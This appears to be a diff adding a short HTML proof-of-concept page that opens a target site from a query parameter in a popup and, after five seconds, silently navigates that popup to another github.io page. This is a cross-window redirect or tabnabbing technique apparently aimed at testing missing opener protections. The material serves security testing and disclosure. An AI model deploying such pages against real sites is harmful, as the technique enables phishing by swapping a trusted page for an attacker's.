@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <style>
+    body {
+      background: linear-gradient(135deg, #e0eafc 0%, #f8fafc 100%);
+      min-height: 100vh;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Segoe UI', 'Arial', sans-serif;
+      transition: background 0.5s;
+    }
+
+    #user-info-message {
+      color: #22223b;
+      background: #f2e9e4;
+      border-radius: 18px;
+      padding: 36px 48px;
+      box-shadow: 0 8px 32px rgba(34, 34, 59, 0.10);
+      font-size: 1.25rem;
+      max-width: 85vw;
+      margin: 0 auto;
+      letter-spacing: 0.01em;
+      line-height: 1.6;
+      border: none;
+      font-weight: 500;
+      transition: box-shadow 0.3s, background 0.3s;
+    }
+
+    #user-info-message:hover {
+      box-shadow: 0 12px 36px rgba(34, 34, 59, 0.15);
+      background: #e9ecef;
+    }
+  </style>
+  <script>
+    // --- POC for demonstrating open redirect behavior ---
+
+    let popupWindowRef; // Holds the reference to the opened popup window
+
+    // Retrieves a required query parameter from the URL.
+    // If the parameter is not found, redirects to a default page.
+    function getRequiredQueryParam(paramName) {
+      const searchParams = new URLSearchParams(window.location.search);
+      if (searchParams.has(paramName)) {
+        return searchParams.get(paramName);
+      }
+      // Redirect if the required parameter is missing
+      window.location.href = "https://sleepyamigo.github.io/coop";
+      return null; // Should not be reached due to redirection
+    }
+
+    // Function to redirect the opened popup window after a set delay.
+    function performDelayedPopupRedirect() {
+      console.log("Redirecting the opened popup to a new location.");
+      if (popupWindowRef && !popupWindowRef.closed) {
+        try {
+          popupWindowRef.location.href = "https://sleepyamigo.github.io/coop/redirected.html";
+        } catch (e) {
+          console.error("Error during popup redirection (possibly cross-origin):", e);
+        }
+      } else {
+        console.warn("Popup window reference is invalid or closed, cannot redirect.");
+      }
+    }
+
+    // Opens the target URL (from query param) in a new window and schedules its redirection.
+    function openTargetAndScheduleRedirect() {
+      const targetUrl = getRequiredQueryParam("target");
+      if (targetUrl) { // Check if targetUrl was successfully retrieved (it should be, due to getRequiredQueryParam's redirect)
+        popupWindowRef = window.open(targetUrl, "dynamicPopupWindow", ""); // Changed window name
+        if (popupWindowRef) {
+          console.log("Target site opened in a new window:", targetUrl);
+          setTimeout(performDelayedPopupRedirect, 5000); // 5-second delay
+        } else {
+          console.warn("Popup window was blocked by the browser or failed to open.");
+          const messageDiv = document.getElementById('user-info-message');
+          if (messageDiv) {
+            messageDiv.innerText += " (Popup blocked. Please enable popups and click again.)";
+          }
+        }
+      }
+    }
+
+    // Initializes the page: sets up the user message and triggers the popup opening.
+    function initializePageBehavior() {
+      const displayTargetUrl = getRequiredQueryParam("target"); // Used for the message
+
+      document.body.addEventListener('click', openTargetAndScheduleRedirect);
+
+      const messageElement = document.createElement('div');
+      messageElement.id = 'user-info-message'; // Keep the ID for styling
+      // Use decodeURIComponent for displaying the URL, in case it has encoded characters
+      messageElement.innerText = `If the site did not automatically open ${decodeURIComponent(displayTargetUrl || '')}, please click anywhere on the page.`;
+
+      // Ensure no duplicate message elements if this function were ever called multiple times
+      const existingMsg = document.getElementById('user-info-message');
+      if (existingMsg) {
+        existingMsg.remove();
+      }
+      document.body.appendChild(messageElement);
+
+      openTargetAndScheduleRedirect(); // Initial attempt to open the popup
+    }
+
+    window.onload = initializePageBehavior;
+  </script>
+</head>
+
+<body></body>
+
+</html>
